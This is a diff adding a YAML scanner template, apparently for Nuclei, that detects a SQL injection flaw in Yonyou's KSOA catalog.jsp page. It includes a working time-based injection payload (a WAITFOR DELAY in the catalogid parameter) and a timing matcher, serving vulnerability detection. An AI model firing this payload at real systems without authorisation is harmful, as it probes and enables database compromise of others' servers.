@@ -1,0 +1,32 @@
+id: yonyou-ksoa-catalog-sqli
+info:
+  name: 用友-时空KSOA catalog-sql 注入漏洞
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://mp.weixin.qq.com/s/DNCElyI4hmjYwAUgyMLL-Q
+  classification:
+    cve-id: 
+  metadata:
+    verified: true/false
+    fofa-query: demo
+    tips:
+    repair:
+    sqlmap:
+    version:
+  tags: sqli,yonyou,ksoa
+
+http:
+  - raw:  
+      - |
+        @timeout: 15s
+        GET /kmc/catalog.jsp?catalogid=';WAITFOR%20DELAY%20'0:0:5'--%20 HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          # - status_code == 200
+          - duration >= 5 && duration < 9
+        condition: and
